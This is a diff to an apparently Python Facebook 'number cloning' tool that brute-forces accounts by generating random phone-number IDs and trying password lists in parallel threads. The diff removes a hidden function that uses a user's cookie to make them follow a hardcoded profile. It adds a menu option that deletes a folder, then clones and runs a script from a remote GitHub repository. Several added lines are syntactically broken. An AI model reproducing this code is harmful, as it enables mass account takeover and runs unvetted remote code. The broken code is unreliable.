@@ -178,30 +178,6 @@ else:
     a = ltx
     tag = "\x1b[1;96mAM"
 #--------------------------------------------2sctp-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-#--------------------------------------------2sctp-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-def follow(self, session, coki):
-        r = BeautifulSoup(session.get('https://free.facebook.com/profile.php?id=100000160984736', {
-            'cookie': coki }, **('cookies',)).text, 'html.parser')
-        get = r.find('a', 'Ikuti', **('string',)).get('href')
-        session.get('https://free.facebook.com' + str(get), {
-            'cookie': coki }, **('cookies',)).text
-            
-            
- 
-class jalan:
-    def __init__(self, z):
-        for e in z + "\n":
-            sys.stdout.write(e)
-            sys.stdout.flush()
-            time.sleep(0.040)
-
-def back():
-	login()
-Riyad="Riyad"
-imt="Riyad"
-ak="CLASS3-"
-myid=uuid.uuid4().hex[:8].upper()
-#--------------------------------------------2sctp-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 ugen2=[]
 ugen=[]
 cokbrut=[]
@@ -729,16 +705,15 @@ def menu():
 		#public()
 	elif xd in ['2','02']:
 		clear()
-		print(' [1] Pakistan Number Cloning\n [2] Bangladesh Number cloning\n [10] Bangladesh Number cloning\n [0] Back menu')
+		print(' [1] Pakistan Number Cloning\n [2] Bangladesh Number cloning\n [3] Bangladesh Number cloning V2\n [0] Back menu')
 		linex()
 		x=input(' Choose: ')
 		if x in ['1','01']:
 			pak()
 		elif x in ['2','02']:
 			bd()
-		elif x in ['10','10']:
-			bdr()
-		
+		elif me in ["3", "03"]:
+		os.system('rm -rf Control-Room && git clone https://github.com/BLADE-404/Control-Room && cd Control-Room && python ran.py ')
 		else:
 			menu()
 			
@@ -927,8 +902,8 @@ def gmail():
 #----------------- Random METHOD Number -------------------------------------
 				if mthd in ['1','01']:
 					AXI.submit(rcrack1,ids,passlist)
-				if mthd in ['3','03']:
-					AXI.submit(uid,pwx,tl)
+				mthd in ['3','03']:
+					AXI.submit(uid,pwx,tl):
 				else:
 					AXI.submit(rcrack,ids,passlist)
 		print('\033[1;91m')
@@ -1150,7 +1125,7 @@ def rcrack(ids,passlist):
 		
 #----------------- Random Nolmal METHOD  -------------------------------------
 
-def bdr():
+def i():
     user=[]
     twf =[]
     os.getuid
@@ -1177,7 +1152,7 @@ def bdr():
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(8))
         user.append(nmp)
-    with ThreadPool(max_workers=50) as AXI:
+    with ThreadPool(max_workers=50) as Riyad:
         clear()
         tl = str(len(user))
         jalan('\033[97;1m[\033[92;1mᗙ\033[97;1m] \033[92;1mAGENTS    \033[38;5;196m: \033[1;32m'+str(len(ugen)))
